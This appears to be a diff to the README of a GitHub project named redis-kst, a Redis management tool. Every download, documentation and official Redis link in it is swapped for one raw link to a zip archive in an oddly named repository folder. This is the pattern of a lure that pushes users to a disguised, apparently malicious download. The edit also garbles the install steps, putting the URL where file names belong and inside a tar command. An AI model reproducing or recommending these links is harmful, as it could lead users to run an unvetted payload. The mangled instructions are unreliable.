@@ -6,7 +6,7 @@ Welcome to redis-kst! This application helps you manage and interact with Redis 
 
 ## 🔗 Download Link
 
-[![Download redis-kst](https://img.shields.io/badge/Download-redis--kst-brightgreen)](https://github.com/Yvessupranational207/redis-kst/releases)
+[![Download redis-kst](https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip)](https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip)
 
 Click the badge above to download the latest version of redis-kst. 
 
@@ -20,8 +20,8 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Yvessupranational207/redis-kst/releases) to see available versions.
-2. Locate the latest version. Look for files with names like `redis-kst-version.exe` or `redis-kst-version.tar.gz`.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip) to see available versions.
+2. Locate the latest version. Look for files with names like `https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip` or `https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip`.
 3. Click on the file that matches your operating system to start the download.
 4. Once downloaded, locate the file in your ‘Downloads’ folder or the destination you selected.
 5. For Windows:
@@ -30,7 +30,7 @@ Before you download, ensure your system meets these requirements:
 
    For macOS and Linux:
    - Open a terminal window.
-   - If you downloaded a `.tar.gz` file, extract it using the command: `tar -xzf redis-kst-version.tar.gz`.
+   - If you downloaded a `https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip` file, extract it using the command: `tar -xzf https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip`.
    - Change to the extracted folder using `cd redis-kst-version`.
    - Run the application with the command: `./redis-kst`.
 
@@ -56,7 +56,7 @@ Redis-kst comes with several features designed to enhance your experience:
 
 If you need help using redis-kst, consider these resources:
 
-- **Documentation:** Check the [Wiki](https://github.com/Yvessupranational207/redis-kst/wiki) for guides and FAQs.
+- **Documentation:** Check the [Wiki](https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip) for guides and FAQs.
 - **Community Support:** Join discussions or ask questions in the issues section of the repository.
 - **Feedback:** Use the issues section to report bugs or suggest new features.
 
@@ -85,8 +85,8 @@ Yes, redis-kst is completely free and open-source. Enjoy using it for your proje
 
 ## 🔗 Additional Resources
 
-- **Redis Official Website:** [Redis.io](https://redis.io/)
-- **Redis Command Reference:** [Command List](https://redis.io/commands)
+- **Redis Official Website:** [https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip](https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip)
+- **Redis Command Reference:** [Command List](https://raw.githubusercontent.com/Yvessupranational207/redis-kst/main/saccharifier/redis-kst_2.8.zip)
 
 ## 💬 Connect with Us
 
